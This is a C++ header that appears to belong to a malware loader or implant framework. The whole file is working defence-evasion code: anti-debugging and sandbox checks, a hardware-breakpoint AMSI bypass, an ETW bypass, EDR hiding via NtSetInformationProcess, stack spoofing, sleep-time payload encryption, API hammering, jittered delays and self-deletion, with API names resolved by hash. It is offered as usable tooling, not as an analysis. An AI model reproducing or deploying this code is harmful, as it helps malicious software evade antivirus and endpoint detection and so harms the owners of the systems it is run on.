#pragma once
#include "syscalls.hpp"
#include <intrin.h>
#include <cstdint>

static bool _timing_check(){
    LARGE_INTEGER f,t1,t2;
    if(!QueryPerformanceFrequency(&f))return false;
    QueryPerformanceCounter(&t1);
    volatile int s=0;
    for(int i=0;i<10000;i++)s+=i;
    QueryPerformanceCounter(&t2);
    double dt=(double)(t2.QuadPart-t1.QuadPart)/(double)f.QuadPart;
    return dt>0.05;
}

static bool _ntglobal_check(){
#ifdef _WIN64
    BYTE* peb=(BYTE*)__readgsqword(0x60);
    ULONG ngf=*(ULONG*)(peb+0xBC);
#else
    BYTE* peb=(BYTE*)__readfsdword(0x30);
    ULONG ngf=*(ULONG*)(peb+0x68);
#endif
    return (ngf&0x70)!=0;
}

static bool _hwbp_check(){
    CONTEXT ctx;memset(&ctx,0,sizeof(ctx));
    ctx.ContextFlags=CONTEXT_DEBUG_REGISTERS;
    HANDLE t=GetCurrentThread();
    void* nt=_getmod(_hash("ntdll.dll"));
    if(!nt)return false;
    typedef NTSTATUS(NTAPI*pNGCT)(HANDLE,PCONTEXT);
    pNGCT gc=(pNGCT)_getapi(nt,_hash("NtGetContextThread"));
    if(!gc||gc(t,&ctx)!=0)return false;
    return ctx.Dr0!=0||ctx.Dr1!=0||ctx.Dr2!=0||ctx.Dr3!=0;
}

static bool _basic_debug_check(){
#ifdef _WIN64
    if(((PPEB)__readgsqword(0x60))->BeingDebugged)return true;
#else
    if(((PPEB)__readfsdword(0x30))->BeingDebugged)return true;
#endif
    void* nt=_getmod(_hash("ntdll.dll"));
    if(!nt)return false;
    typedef NTSTATUS(NTAPI*pNQIP)(HANDLE,ULONG,PVOID,ULONG,PULONG);
    pNQIP q=(pNQIP)_getapi(nt,_hash("NtQueryInformationProcess"));
    if(q){
        DWORD port=0;
        if(q(GetCurrentProcess(),0x07,&port,sizeof(port),0)==0&&port!=0)return true;
        DWORD flags=0;
        if(q(GetCurrentProcess(),0x1f,&flags,sizeof(flags),0)==0&&flags==0)return true;
    }
    return false;
}

static bool _tracer_check(){
    PPEB p=nullptr;
#ifdef _WIN64
    p=(PPEB)__readgsqword(0x60);
#else
    p=(PPEB)__readfsdword(0x30);
#endif
    if(!p||!p->ProcessParameters)return false;
    void* nt=_getmod(_hash("ntdll.dll"));
    if(!nt)return false;
    typedef NTSTATUS(NTAPI*pNQIP)(HANDLE,ULONG,PVOID,ULONG,PULONG);
    pNQIP q=(pNQIP)_getapi(nt,_hash("NtQueryInformationProcess"));
    if(q){
        DWORD f=1;
        if(q(GetCurrentProcess(),0x1f,&f,sizeof(f),0)==0&&f==0)return true;
    }
    return false;
}

static bool AntiDebug(bool check_timing,bool check_ntglobal,bool check_hwbp,bool check_tracer){
    if(check_timing&&_timing_check())return true;
    if(check_ntglobal&&_ntglobal_check())return true;
    if(check_hwbp&&_hwbp_check())return true;
    if(_basic_debug_check())return true;
    if(check_tracer&&_tracer_check())return true;
    return false;
}

static void _hide_edr(){
    void* nt=_getmod(_hash("ntdll.dll"));
    if(!nt)return;
    typedef NTSTATUS(NTAPI*pNSIP)(HANDLE,ULONG,PVOID,ULONG);
    pNSIP s=(pNSIP)_getapi(nt,_hash("NtSetInformationProcess"));
    if(s){
        struct{ULONG v;ULONG r;PVOID c;}info={0,0,0};
        s(GetCurrentProcess(),40,&info,sizeof(info));
    }
}

typedef USHORT(WINAPI*pRCSBT)(ULONG,ULONG,PVOID*,PULONG);
static void _spoof_stack(int depth){
    void* nt=_getmod(_hash("ntdll.dll"));
    if(!nt)return;
    pRCSBT rcs=(pRCSBT)_getapi(nt,_hash("RtlCaptureStackBackTrace"));
    if(!rcs)return;
    PVOID frames[16];ULONG hash=0;
    USHORT n=rcs(0,depth<16?depth:16,frames,&hash);
    if(n<2)return;
    DWORD64* fp=nullptr;
#ifdef _WIN64
    fp=(DWORD64*)__readgsqword(0x20);
    if(!fp)return;
    for(int i=0;i<(int)n&&i<depth;i++){
        fp[1]=(DWORD64)frames[i];
        DWORD64* nfp=(DWORD64*)*fp;
        if(!nfp||nfp<=fp)break;
        fp=nfp;
    }
#endif
}

typedef HRESULT(WINAPI*pASB)(HANDLE,PVOID,DWORD);
static pASB _orig_asb=nullptr;
static HANDLE _veh_handle=nullptr;

static LONG WINAPI _hwbp_handler(PEXCEPTION_POINTERS ep){
    if(ep->ExceptionRecord->ExceptionCode==EXCEPTION_SINGLE_STEP){
        if(ep->ExceptionRecord->ExceptionAddress==(void*)_orig_asb){
            ep->ContextRecord->Dr0=0;ep->ContextRecord->Dr7&=~(1<<0);
            ep->ContextRecord->Rax=0;
            ep->ContextRecord->Rip=*(DWORD64*)ep->ContextRecord->Rsp;
            ep->ContextRecord->Rsp+=8;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

static void _bypass_amsi(){
    void* nt=_getmod(_hash("ntdll.dll"));
    if(!nt)return;
    void* amsi=_getmod(_hash("amsi.dll"));
    if(!amsi)return;
    _orig_asb=(pASB)_getapi(amsi,_hash("AmsiScanBuffer"));
    if(!_orig_asb)return;
    if(!_veh_handle)_veh_handle=AddVectoredExceptionHandler(1,_hwbp_handler);
    CONTEXT ctx;memset(&ctx,0,sizeof(ctx));
    ctx.ContextFlags=CONTEXT_DEBUG_REGISTERS;
    HANDLE t=GetCurrentThread();
    typedef NTSTATUS(NTAPI*pNGCT)(HANDLE,PCONTEXT);
    pNGCT gct=(pNGCT)_getapi(nt,_hash("NtGetContextThread"));
    if(gct)gct(t,&ctx);
    ctx.Dr0=(DWORD64)_orig_asb;
    ctx.Dr7|=0x1;
    typedef NTSTATUS(NTAPI*pNSCT)(HANDLE,PCONTEXT);
    pNSCT sct=(pNSCT)_getapi(nt,_hash("NtSetContextThread"));
    if(sct)sct(t,&ctx);
}

static void _bypass_etw(){
    void* ntdll=_getmod(_hash("ntdll.dll"));
    if(!ntdll)return;
    FARPROC etw=_getapi(ntdll,_hash("EtwEventWrite"));
    if(!etw)return;
    CONTEXT ctx;memset(&ctx,0,sizeof(ctx));
    ctx.ContextFlags=CONTEXT_DEBUG_REGISTERS;
    HANDLE t=GetCurrentThread();
    typedef NTSTATUS(NTAPI*pNGCT)(HANDLE,PCONTEXT);
    pNGCT gct=(pNGCT)_getapi(ntdll,_hash("NtGetContextThread"));
    if(gct)gct(t,&ctx);
    ctx.Dr1=(DWORD64)etw;
    ctx.Dr7|=(0x1<<2);
    ctx.Dr7&=~((0x1<<3));
    typedef NTSTATUS(NTAPI*pNSCT)(HANDLE,PCONTEXT);
    pNSCT sct=(pNSCT)_getapi(ntdll,_hash("NtSetContextThread"));
    if(sct)sct(t,&ctx);
}

static void _junk(){volatile int _a=100,_b=200;for(int i=0;i<50;i++)_a=(_a+_b)%73;_b=_a*3%97;}

__attribute__((unused)) static void _obf_sleep(unsigned char* buf,int len,const unsigned char* k,int kl,
    DWORD base_ms,DWORD jitter_pct,bool use_aes,const unsigned char*aes_k,const unsigned char*aes_iv){
    DWORD jitter=0;
    if(jitter_pct>0){
        int r=rand()%100;
        jitter=(DWORD)((double)base_ms*(double)jitter_pct/100.0*(double)(r%25+1)/100.0);
    }
    DWORD slp=(base_ms+jitter);
    if(buf&&len>0){
        if(use_aes&&aes_k&&aes_iv){
            unsigned char sk[16];
            for(int i=0;i<16;i++)sk[i]=aes_k[i]^(unsigned char)((slp>>(i%4)*8)&0xFF);
            _xorf(buf,len,sk,16);
        }else{
            _xorf(buf,len,k,kl);
        }
    }
    LARGE_INTEGER lt;lt.QuadPart=-(LONGLONG)(slp*10000);
    _call(0x4d8c8bb0,0,(uintptr_t)&lt);
    if(buf&&len>0){
        if(use_aes&&aes_k&&aes_iv){
            unsigned char sk[16];
            for(int i=0;i<16;i++)sk[i]=aes_k[i]^(unsigned char)((slp>>(i%4)*8)&0xFF);
            _xorf(buf,len,sk,16);
        }else{
            _xorf(buf,len,k,kl);
        }
    }
}

static bool _sandbox_check(){
    SYSTEM_INFO si;GetSystemInfo(&si);
    if(si.dwNumberOfProcessors<__SB_MIN_CPU__)return true;
    MEMORYSTATUSEX ms;ms.dwLength=sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    if(ms.ullTotalPhys<__SB_MIN_RAM__)return true;
    ULARGE_INTEGER df;GetDiskFreeSpaceExA(0,&df,0,0);
    if(df.QuadPart<__SB_MIN_DISK__)return true;
    DWORD up=GetTickCount();
    if(up<__SB_MIN_UPTIME__)return true;
    return false;
}

static void _delayed_execution(DWORD base_ms,DWORD jitter_pct){
    DWORD jitter=0;
    if(jitter_pct>0){
        int r=rand()%100;
        int sign=(r<50)?-1:1;
        int var=(r%30+1);
        jitter=(DWORD)((double)base_ms*(double)jitter_pct/100.0*(double)(sign*var)/100.0);
    }
    DWORD slp=(base_ms+jitter);
    Sleep(slp);
}

typedef void* (WINAPI *pHeapAlloc)(void*,DWORD,SIZE_T);
typedef BOOL (WINAPI *pHeapFree)(void*,DWORD,void*);
typedef LSTATUS (WINAPI *pRegOpenKey)(HKEY,LPCWSTR,PHKEY);
static void _api_hammer(int rounds){
    HMODULE krn=(HMODULE)_getmod(_hash("kernel32.dll"));
    HMODULE adv=(HMODULE)_getmod(_hash("advapi32.dll"));
    if(!krn)return;
    void* heap=GetProcessHeap();
    pHeapAlloc hall=(pHeapAlloc)_getapi(krn,_hash("HeapAlloc"));
    pHeapFree hfree=(pHeapFree)_getapi(krn,_hash("HeapFree"));
    for(int i=0;i<rounds;i++){
        void* p=hall(heap,HEAP_ZERO_MEMORY,256);
        memset(p,i,256);
        if(adv){
            HKEY k=0;
            pRegOpenKey ro=(pRegOpenKey)_getapi(adv,_hash("RegOpenKeyExW"));
            if(ro)ro(HKEY_CURRENT_USER,L"Software\\Microsoft\\Windows\\CurrentVersion",&k);
            if(k)RegCloseKey(k);
        }
        if(hfree)hfree(heap,0,p);
    }
}

static void _self_delete(){
    wchar_t p[MAX_PATH];
    GetModuleFileNameW(0,p,MAX_PATH);
    #if CFG_SD_METHOD==0
    CloseHandle((HANDLE)(ULONG_PTR)__SELF_DEL_HANDLE__);
    DeleteFileW(p);
    #else
    MoveFileExW(p,0,MOVEFILE_DELAY_UNTIL_REBOOT);
    #endif
}
